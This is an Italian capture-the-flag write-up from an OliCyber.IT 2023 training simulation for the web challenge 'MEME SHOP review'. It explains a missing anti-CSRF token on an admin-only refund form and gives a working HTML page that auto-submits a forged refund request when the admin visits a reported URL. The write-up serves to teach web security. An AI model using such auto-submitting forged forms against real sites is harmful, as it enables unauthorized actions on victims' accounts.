# OliCyber.IT 2023 - Simulazione training camp 2

## [web] MEME SHOP review (33 risoluzioni)

Abbiamo una versione aggiornata dell'applicazione precedente in cui però anche manomettendo i cookie non si ottiene niente in quanto il calcolo del prezzo è fatto lato server questa volta.
Tuttavia abbiamo una funzionalità di rimborso che però funziona solo se è eseguita dall'utente admin.

Inoltre abbiamo la possibilità di inserire una url che verrà visitata dall'admin tramite la funzione di report.

### Soluzione

Guardando per bene il form di rimborso notiamo l'assenza di qualsiasi sorta di token anti csrf, possiamo quindi exploitare questa vulnerabilità con il seguente codice.

Mettiamo quindi il codice su un qualsiasi hosting, modifichiamo lo user id inserendo quello del nostro utente, che si può ricavare dallo stesso form di rimborso, e successivamente sottomettiamo la URL all'admin.

Ricaricando la pagina possiamo quindi acquistare legittimamente la flag.

### Exploit

```html
<html>
  <title>Exploit</title>

  <body>
    <form
      action="https://meme_shop_review.challs.olicyber.it/refund.php"
      method="POST"
      id="form"
    >
      <input class="form-input" type="number" name="amount" value="1000" />
      <input type="number" name="user_id" value="2" />
      <input type="submit" value="" />
    </form>

    <script>
      setTimeout(() => {
        console.log("log");
        document.getElementById("form").submit();
      }, 1000);
    </script>
  </body>
</html>
```
